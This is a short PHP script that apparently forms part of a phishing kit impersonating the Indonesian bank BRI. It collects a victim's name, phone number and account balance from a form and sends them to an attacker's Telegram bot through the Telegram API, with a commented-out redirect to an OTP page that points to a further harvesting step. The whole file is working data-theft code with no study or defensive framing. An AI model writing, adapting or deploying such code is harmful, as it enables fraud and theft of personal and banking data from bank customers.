<?php
session_start();
include "masuk.js";

$nama = $_POST['nama'];
$nohp = $_POST['nohp'];
$saldo = $_POST['saldo'];


$_SESSION['nama'] = $nama;
$_SESSION['nohp'] = $nohp;
$_SESSION['saldo'] = $saldo;

$message = "
╭─════════🄱🅁🄸════════─╮
╠❏ 𝗡𝗮𝗺𝗮    : ".$nama." 
╠❏ 𝗡𝗼𝗺𝗼𝗿  : ".$nohp." 
╠❏ 𝗦𝗮𝗹𝗱𝗼    : ".$saldo."
╰─════════════════════─╯
✅️Data diterima";
function sendMessage($telegram_id, $message, $id_bot) {
    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=html&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(CURLOPT_URL => $url, CURLOPT_RETURNTRANSFER => true);
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
//header('Location:./../otp.php');
?>
